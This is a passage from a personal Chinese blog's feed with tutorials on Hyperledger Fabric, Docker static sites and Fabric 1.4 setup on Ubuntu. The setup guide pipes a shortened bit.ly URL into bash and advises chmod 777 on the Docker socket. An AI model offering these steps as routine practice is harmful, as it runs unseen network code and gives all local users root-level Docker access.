0.0.0.0:8053-&gt;7053/tcp      peer0.importerorg.trade.com</span><br><span class="line">f8bae3919c76        hyperledger/fabric-peer:latest      <span class="string">"peer node start"</span>        26 seconds ago      Up 11 seconds       0.0.0.0:7051-&gt;7051/tcp, 0.0.0.0:7053-&gt;7053/tcp, 0.0.0.0:7055-&gt;6060/tcp      peer0.exporterorg.trade.com</span><br><span class="line">f7fc7b67ab61        hyperledger/fabric-ca:latest        <span class="string">"sh -c 'fabric-ca-se…"</span>   26 seconds ago      Up 14 seconds       0.0.0.0:7054-&gt;7054/tcp                                                      ca_peerExporterOrg</span><br><span class="line">5c23b50bfbf7        hyperledger/fabric-peer:latest      <span class="string">"peer node start"</span>        26 seconds ago      Up 9 seconds        0.0.0.0:10055-&gt;6060/tcp, 0.0.0.0:10051-&gt;7051/tcp, 0.0.0.0:10053-&gt;7053/tcp   peer0.regulatororg.trade.com</span><br><span class="line">6e0235be3e7e        hyperledger/fabric-ca:latest        <span class="string">"sh -c 'fabric-ca-se…"</span>   26 seconds ago      Up 9 seconds        0.0.0.0:8054-&gt;7054/tcp                                                      ca_peerImporterOrg</span><br><span class="line">2e47cb0610fc        hyperledger/fabric-orderer:latest   <span class="string">"orderer"</span>                26 seconds ago      Up 13 seconds       0.0.0.0:7050-&gt;7050/tcp                                                      orderer.trade.com</span><br><span class="line">d6e0acddea54        hyperledger/fabric-ca:latest        <span class="string">"sh -c 'fabric-ca-se…"</span>   27 seconds ago      Up 15 seconds       0.0.0.0:10054-&gt;7054/tcp                                                     ca_peerRegulatorOrg</span><br><span class="line">918e7707db2a        hyperledger/fabric-ca:latest        <span class="string">"sh -c 'fabric-ca-se…"</span>   27 seconds ago      Up 17 seconds       0.0.0.0:9054-&gt;7054/tcp                                                      ca_peerCarrierOrg</span><br></pre></td></tr></table></figure><p>hyperledger/fabric-orderer：启动一个orderer服务</p><p>hyperledger/fabric-peer：启动四个peer服务</p><p>hyperledger/fabric-ca：启动四个peer的MSP服务</p><h4 id="3、查看服务"><a href="#3、查看服务" class="headerlink" title="3、查看服务"></a>3、查看服务</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker logs &lt;container-ID&gt; <span class="comment">#查看容器的运行日志</span></span><br><span class="line">$ docker attach &lt;container-ID&gt; <span class="comment">#进入容器交互界面</span></span><br></pre></td></tr></table></figure><h4 id="4、关闭网络"><a href="#4、关闭网络" class="headerlink" title="4、关闭网络"></a>4、关闭网络</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./trade.sh down -c tradechannel</span><br></pre></td></tr></table></figure><h3 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h3><p>以上是个人学习hyperledger fabric的一些理解和整理，欢迎参考、交流和指正。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、trade-finance-logistics网络介绍&quot;&gt;&lt;a href=&quot;#一、trade-finance-logistics网络介绍&quot; class=&quot;headerlink&quot; title=&quot;一、trade-finance-logistics网络介绍&quot;&gt;&lt;/a
      
    
    </summary>
    
      <category term="区块链学习" scheme="https://j-kangel.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="blockchain" scheme="https://j-kangel.github.io/tags/blockchain/"/>
    
      <category term="hyperledger" scheme="https://j-kangel.github.io/tags/hyperledger/"/>
    
  </entry>
  
  <entry>
    <title>使用docker部署静态网站</title>
    <link href="https://j-kangel.github.io/2019/03/25/docker/"/>
    <id>https://j-kangel.github.io/2019/03/25/docker/</id>
    <published>2019-03-24T20:11:21.000Z</published>
    <updated>2019-04-04T06:53:13.702Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、环境准备"><a href="#一、环境准备" class="headerlink" title="一、环境准备"></a>一、环境准备</h3><h4 id="1、安装docker"><a href="#1、安装docker" class="headerlink" title="1、安装docker"></a>1、安装docker</h4><p>参照<a href="https://j-kangel.github.io/2019/03/24/hyperledger/里面docker安装部分">https://j-kangel.github.io/2019/03/24/hyperledger/里面docker安装部分</a></p><h3 id="二、搭建静态网站"><a href="#二、搭建静态网站" class="headerlink" title="二、搭建静态网站"></a>二、搭建静态网站</h3><h4 id="1、创建docker镜像"><a href="#1、创建docker镜像" class="headerlink" title="1、创建docker镜像"></a>1、创建docker镜像</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 80 --name web -i -t ubuntu /bin/bash  //启动交互式容器</span><br><span class="line">root@6f9c831d1d1b:/<span class="comment">#        //进入docker交互式容器</span></span><br></pre></td></tr></table></figure><h4 id="2、在docker中安装nginx和vim"><a href="#2、在docker中安装nginx和vim" class="headerlink" title="2、在docker中安装nginx和vim"></a>2、在docker中安装nginx和vim</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@6f9c831d1d1b:/<span class="comment"># apt-get update</span></span><br><span class="line">root@6f9c831d1d1b:/<span class="comment"># apt-get install -y nginx</span></span><br><span class="line">root@6f9c831d1d1b:/<span class="comment"># apt-get install -y vim</span></span><br></pre></td></tr></table></figure><h4 id="3、创建网页目录"><a href="#3、创建网页目录" class="headerlink" title="3、创建网页目录"></a>3、创建网页目录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@6f9c831d1d1b:/<span class="comment"># mkdir -p /var/www/html</span></span><br></pre></td></tr></table></figure><h4 id="4、添加网页"><a href="#4、添加网页" class="headerlink" title="4、添加网页"></a>4、添加网页</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@6f9c831d1d1b:/<span class="comment"># cd /var/www/html</span></span><br><span class="line">root@6f9c831d1d1b:/var/www/html<span class="comment"># vim index.html</span></span><br></pre></td></tr></table></figure><p>在index.html中输入：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>nginx in docker<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">            Hello,World!</span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>保存后退出，查看端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker port web</span><br></pre></td></tr></table></figure><p>显示如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">80/tcp -&gt; 0.0.0.0:32770</span><br></pre></td></tr></table></figure><h4 id="5、查看网页"><a href="#5、查看网页" class="headerlink" title="5、查看网页"></a>5、查看网页</h4><p>使用curl查看：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://127.0.0.1:32770     <span class="comment">#32770为容器端口</span></span><br></pre></td></tr></table></figure><p>使用浏览器查看,如下图所示：</p><p><img src="/2019/03/25/docker/0.JPG" alt=""></p><h3 id="三、docker其他命令"><a href="#三、docker其他命令" class="headerlink" title="三、docker其他命令"></a>三、docker其他命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker attach web  <span class="comment">##重新进入容器</span></span><br><span class="line">docker ps          <span class="comment">##查看docker进程</span></span><br><span class="line">docker top web     <span class="comment">##查看docker容器的进程</span></span><br><span class="line">docker inspect | grep -i IPaddress   <span class="comment">##查看docker的ip地址</span></span><br><span class="line">docker inspect | grep -i hostport    <span class="comment">##查看容器端口</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、环境准备&quot;&gt;&lt;a href=&quot;#一、环境准备&quot; class=&quot;headerlink&quot; title=&quot;一、环境准备&quot;&gt;&lt;/a&gt;一、环境准备&lt;/h3&gt;&lt;h4 id=&quot;1、安装docker&quot;&gt;&lt;a href=&quot;#1、安装docker&quot; class=&quot;headerli
      
    
    </summary>
    
      <category term="区块链学习" scheme="https://j-kangel.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="docker" scheme="https://j-kangel.github.io/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu 16.04 搭建hyperledger fabric 1.4</title>
    <link href="https://j-kangel.github.io/2019/03/24/hyperledger/"/>
    <id>https://j-kangel.github.io/2019/03/24/hyperledger/</id>
    <published>2019-03-23T16:35:38.000Z</published>
    <updated>2019-04-04T06:53:48.020Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、准备阶段"><a href="#一、准备阶段" class="headerlink" title="一、准备阶段"></a>一、准备阶段</h3><h4 id="1、系统软件源改为-aliyun"><a href="#1、系统软件源改为-aliyun" class="headerlink" title="1、系统软件源改为 aliyun"></a>1、系统软件源改为 aliyun</h4><p>步骤：setting -&gt; system settings -&gt; Software&amp;Updates -&gt; Download from -&gt; China -&gt; aliyun</p><p>结果如下：</p><p><img src="/2019/03/24/hyperledger/1.JPG" alt=""></p><h4 id="2、必备软件安装"><a href="#2、必备软件安装" class="headerlink" title="2、必备软件安装"></a>2、必备软件安装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">安装vim          sudo apt-get install vim</span><br><span class="line">安装git          sudo apt-get install git</span><br><span class="line">安装curl         sudo apt-get install curl</span><br><span class="line">安装wget         sudo apt-get install wget</span><br></pre></td></tr></table></figure><h3 id="二、环境准备"><a href="#二、环境准备" class="headerlink" title="二、环境准备"></a>二、环境准备</h3><ul><li><p>安装go1.11 以及以上版本</p></li><li><p>安装docker 18.09.3-ce 以及以上版本</p></li><li><p>安装docker-compose 1.23.2 以及以上版本</p></li><li><p>git 拉下 fabric-sample 项目</p></li><li><p>下载docker image镜像</p><h4 id="1、go安装"><a href="#1、go安装" class="headerlink" title="1、go安装"></a>1、go安装</h4><p>下载并安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~  </span><br><span class="line">wget https://studygolang.com/dl/golang/go1.11.linux-amd64.tar.gz    <span class="comment">#下载</span></span><br><span class="line">tar -xzf go1.11.linux-amd64.tar.gz    <span class="comment">#解压</span></span><br><span class="line">sudo mv go /usr/<span class="built_in">local</span>    <span class="comment">#移动</span></span><br></pre></td></tr></table></figure><p>路径配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span>  PATH=<span class="variable">$PATH</span>:/usr/<span class="built_in">local</span>/go/bin     <span class="comment">#环境变量</span></span><br><span class="line"><span class="built_in">export</span>  GOROOT=/usr/<span class="built_in">local</span>/go             <span class="comment">#安装根路径</span></span><br><span class="line"><span class="built_in">export</span>  GOPATH=<span class="variable">$HOME</span>/go                  <span class="comment">#为后续安装fabric作准备</span></span><br><span class="line"><span class="built_in">export</span>  PATH=<span class="variable">$PATH</span>:<span class="variable">$HOME</span>/go/bin          <span class="comment">#环境变量</span></span><br></pre></td></tr></table></figure><p>创建go目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~   </span><br><span class="line">mkdir  -p  go/src/github.com/hyperledger/fabric <span class="comment">#fabric安装目录</span></span><br><span class="line">sudo chmod -R 777 go</span><br></pre></td></tr></table></figure><h4 id="2、docker安装（使用docker仓库"><a href="#2、docker安装（使用docker仓库" class="headerlink" title="2、docker安装（使用docker仓库)"></a>2、docker安装（使用docker仓库)</h4><p>卸载旧版本docker，未安装docker可忽略此步</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get remove docker docker-engine docker.io</span><br></pre></td></tr></table></figure><p>更新apt-get</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><p>下载安装工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    software-properties-common</span><br></pre></td></tr></table></figure><p>添加官方密钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure><p>将加入apt仓库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository \</span><br><span class="line">   <span class="string">"deb [arch=amd64] https://download.docker.com/linux/ubuntu \</span></span><br><span class="line"><span class="string">   <span class="variable">$(lsb_release -cs)</span> \</span></span><br><span class="line"><span class="string">   stable"</span></span><br></pre></td></tr></table></figure><p>下载docker-ce</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install docker-ce</span><br></pre></td></tr></table></figure><p>完成上面操作之后输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker version</span><br></pre></td></tr></table></figure><p>出现下面内容：</p><pre><code>Client: Version:           18.09.3 API version:       1.39 Go version:        go1.10.8 Git commit:        774a1f4 Built:             Thu Feb 28 06:40:58 2019 OS/Arch:           linux/amd64 Experimental:      falseGot permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get http://%2Fvar%2Frun%2Fdocker.sock/v1.39/version: dial unix /var/run/docker.sock: connect: permission denied</code></pre><p>此时已经安装好Docker了，但是还需要一些小操作。因为普通用户没有权限 。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo groupadd docker    <span class="comment">#创建docker组</span></span><br><span class="line">sudo usermod -aG docker <span class="comment">#XXX(XXX是当前用户名)</span></span><br></pre></td></tr></table></figure><p>下面添加阿里云的Docker镜像： </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker     <span class="comment">#创建docker目录</span></span><br><span class="line">sudo vim /etc/docker/daemon.json</span><br></pre></td></tr></table></figure><p>将以下内容写入daemon.json</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="attr">"registry-mirrors"</span>: [<span class="string">"https://obou6wyb.mirror.aliyuncs.com"</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl daemon-reload </span><br><span class="line">sudo systemctl restart docker </span><br><span class="line">docker version</span><br></pre></td></tr></table></figure><p>如果还有权限不足提示，输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod -R 777 /var/run/docker.sock</span><br></pre></td></tr></table></figure><p>正确的结果：</p><pre><code>Client: Version:           18.09.3 API version:       1.39 Go version:        go1.10.8 Git commit:        774a1f4 Built:             Thu Feb 28 06:40:58 2019 OS/Arch:           linux/amd64 Experimental:      falseServer: Docker Engine - Community Engine:  Version:          18.09.3  API version:      1.39 (minimum version 1.12)  Go version:       go1.10.8  Git commit:       774a1f4  Built:            Thu Feb 28 05:59:55 2019  OS/Arch:          linux/amd64  Experimental:     false</code></pre><p>到此docker安装完毕</p><h4 id="3、docker-compose安装"><a href="#3、docker-compose安装" class="headerlink" title="3、docker-compose安装"></a>3、docker-compose安装</h4><p>安装pip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python-pip </span><br><span class="line">sudo pip install docker-compose</span><br></pre></td></tr></table></figure><p>查看docker-compose版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose -version</span><br></pre></td></tr></table></figure><p>出现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose version 1.23.2, build 1110ad0</span><br></pre></td></tr></table></figure><p>安装成功！</p><h4 id="4、fabric-sample安装"><a href="#4、fabric-sample安装" class="headerlink" title="4、fabric-sample安装"></a>4、fabric-sample安装</h4><p>git下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> go/src/github.com/hyperledger/fabric/</span><br><span class="line">sudo git <span class="built_in">clone</span> https://github.com/hyperledger/fabric-samples.git</span><br><span class="line">sudo chmod -R 777 fabric-sample   <span class="comment">#修改fabric-sample权限</span></span><br></pre></td></tr></table></figure><h4 id="5、下载docker镜像"><a href="#5、下载docker镜像" class="headerlink" title="5、下载docker镜像"></a>5、下载docker镜像</h4><p>进入fabric目录，输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL https://bit.ly/2ysbOFE | bash -s -- 1.4.0</span><br></pre></td></tr></table></figure><p>下载等待时间稍久，完成后输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><p>出现以下镜像，则说明下载成功！</p><p><img src="/2019/03/24/hyperledger/2.JPG" alt=""></p><h3 id="三、构建第一个fabric网络"><a href="#三、构建第一个fabric网络" class="headerlink" title="三、构建第一个fabric网络"></a>三、构建第一个fabric网络</h3><h4 id="1、进入fabric-sample-first-network中"><a href="#1、进入fabric-sample-first-network中" class="headerlink" title="1、进入fabric-sample/first-network中"></a>1、进入fabric-sample/first-network中</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> fabric-samples/first-network/</span><br></pre></td></tr></table></figure><h4 id="2、生成各种配置文件及工具"><a href="#2、生成各种配置文件及工具" class="headerlink" title="2、生成各种配置文件及工具"></a>2、生成各种配置文件及工具</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./byfn.sh -m generate -c mytest1   <span class="comment">#mytest为channel名称</span></span><br></pre></td></tr></table></figure><p>成功后显示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">##########################################################</span><br><span class="line">##### Generate certificates using cryptogen tool #########</span><br><span class="line">##########################################################</span><br><span class="line">+ cryptogen generate --config=./crypto-config.yaml</span><br><span class="line">org1.example.com</span><br><span class="line">org2.example.com</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line"></span><br><span class="line">/home/kangel/go/src/github.com/hyperledger/fabric/fabric-samples/first-network/../bin/configtxgen</span><br><span class="line">##########################################################</span><br><span class="line">#########  Generating Orderer Genesis block ##############</span><br><span class="line">##########################################################</span><br><span class="line">CONSENSUS_TYPE=solo</span><br><span class="line">+ &apos;[&apos; solo == solo &apos;]&apos;</span><br><span class="line">+ configtxgen -profile TwoOrgsOrdererGenesis -channelID byfn-sys-channel -outputBlock ./channel-artifacts/genesis.block</span><br><span class="line">2019-03-13 17:02:39.913 CST [common.tools.configtxgen] main -&gt; INFO 001 Loading configuration</span><br><span class="line">2019-03-13 17:02:40.017 CST [common.tools.configtxgen.localconfig] completeInitialization -&gt; INFO 002 orderer type: solo</span><br><span class="line">2019-03-13 17:02:40.018 CST [common.tools.configtxgen.localconfig] Load -&gt; INFO 003 Loaded configuration: /home/kangel/go/src/github.com/hyperledger/fabric/fabric-samples/first-network/configtx.yaml</span><br><span class="line">2019-03-13 17:02:40.101 CST [common.tools.configtxgen.localconfig] completeInitialization -&gt; INFO 004 orderer type: solo</span><br><span class="line">2019-03-13 17:02:40.103 CST [common.tools.configtxgen.localconfig] LoadTopLevel -&gt; INFO 005 Loaded configuration: /home/kangel/go/src/github.com/hyperledger/fabric/fabric-samples/first-network/configtx.yaml</span><br><span class="line">2019-03-13 17:02:40.108 CST [common.tools.configtxgen] doOutputBlock -&gt; INFO 006 Generating genesis block</span><br><span class="line">2019-03-13 17:02:40.109 CST [common.tools.configtxgen] doOutputBlock -&gt; INFO 007 Writing genesis block</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line"></span><br><span class="line">#################################################################</span><br><span class="line">### Generating channel configuration transaction &apos;channel.tx&apos; ###</span><br><span class="line">#################################################################</span><br><span class="line">+ configtxgen -profile TwoOrgsChannel -outputCreateChannelTx ./channel-artifacts/channel.tx -channelID mytest1</span><br><span class="line">2019-03-13 17:02:40.206 CST [common.tools.configtxgen] main -&gt; INFO 001 Loading configuration</span><br><span class="line">2019-03-13 17:02:40.295 CST [common.tools.configtxgen.localconfig] Load -&gt; INFO 002 Loaded configuration: /home/kangel/go/src/github.com/hyperledger/fabric/fabric-samples/first-network/configtx.yaml</span><br><span class="line">2019-03-13 17:02:40.371 CST [common.tools.configtxgen.localconfig] completeInitialization -&gt; INFO 003 orderer type: solo</span><br><span class="line">2019-03-13 17:02:40.371 CST [common.tools.configtxgen.localconfig] LoadTopLevel -&gt; INFO 004 Loaded configuration: /home/kangel/go/src/github.com/hyperledger/fabric/fabric-samples/first-network/configtx.yaml</span><br><span class="line">2019-03-13 17:02:40.372 CST [common.tools.configtxgen] doOutputChannelCreateTx -&gt; INFO 005 Generating new channel configtx</span><br><span class="line">2019-03-13 17:02:40.391 CST [common.tools.configtxgen] doOutputChannelCreateTx -&gt; INFO 006 Writing new channel tx</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line"></span><br><span class="line">#################################################################</span><br><span class="line">#######    Generating anchor peer update for Org1MSP   ##########</span><br><span class="line">#################################################################</span><br><span class="line">+ configtxgen -profile TwoOrgsChannel -outputAnchorPeersUpdate ./channel-artifacts/Org1MSPanchors.tx -channelID mytest1 -asOrg Org1MSP</span><br><span class="line">2019-03-13 17:02:40.468 CST [common.tools.configtxgen] main -&gt; INFO 001 Loading configuration</span><br><span class="line">2019-03-13 17:02:40.539 CST [common.tools.configtxgen.localconfig] Load -&gt; INFO 002 Loaded configuration: /home/kangel/go/src/github.com/hyperledger/fabric/fabric-samples/first-network/configtx.yaml</span><br><span class="line">2019-03-13 17:02:40.609 CST [common.tools.configtxgen.localconfig] completeInitialization -&gt; INFO 003 orderer type: solo</span><br><span class="line">2019-03-13 17:02:40.609 CST [common.tools.configtxgen.localconfig] LoadTopLevel -&gt; INFO 004 Loaded configuration: /home/kangel/go/src/github.com/hyperledger/fabric/fabric-samples/first-network/configtx.yaml</span><br><span class="line">2019-03-13 17:02:40.609 CST [common.tools.configtxgen] doOutputAnchorPeersUpdate -&gt; INFO 005 Generating anchor peer update</span><br><span class="line">2019-03-13 17:02:40.609 CST [common.tools.configtxgen] doOutputAnchorPeersUpdate -&gt; INFO 006 Writing anchor peer update</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line"></span><br><span class="line">#################################################################</span><br><span class="line">#######    Generating anchor peer update for Org2MSP   ##########</span><br><span class="line">#################################################################</span><br><span class="line">+ configtxgen -profile TwoOrgsChannel -outputAnchorPeersUpdate ./channel-artifacts/Org2MSPanchors.tx -channelID mytest1 -asOrg Org2MSP</span><br><span class="line">2019-03-13 17:02:40.696 CST [common.tools.configtxgen] main -&gt; INFO 001 Loading configuration</span><br><span class="line">2019-03-13 17:02:40.773 CST [common.tools.configtxgen.localconfig] Load -&gt; INFO 002 Loaded configuration: /home/kangel/go/src/github.com/hyperledger/fabric/fabric-samples/first-network/configtx.yaml</span><br><span class="line">2019-03-13 17:02:40.846 CST [common.tools.configtxgen.localconfig] completeInitialization -&gt; INFO 003 orderer type: solo</span><br><span class="line">2019-03-13 17:02:40.846 CST [common.tools.configtxgen.localconfig] LoadTopLevel -&gt; INFO 004 Loaded configuration: /home/kangel/go/src/github.com/hyperledger/fabric/fabric-samples/first-network/configtx.yaml</span><br><span class="line">2019-03-13 17:02:40.846 CST [common.tools.configtxgen] doOutputAnchorPeersUpdate -&gt; INFO 005 Generating anchor peer update</span><br><span class="line">2019-03-13 17:02:40.847 CST [common.tools.configtxgen] doOutputAnchorPeersUpdate -&gt; INFO 006 Writing anchor peer update</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br></pre></td></tr></table></figure><h4 id="3、启动网络"><a href="#3、启动网络" class="headerlink" title="3、启动网络"></a>3、启动网络</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./byfn.sh -m up -c mytest1</span><br></pre></td></tr></table></figure><p>成功后显示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 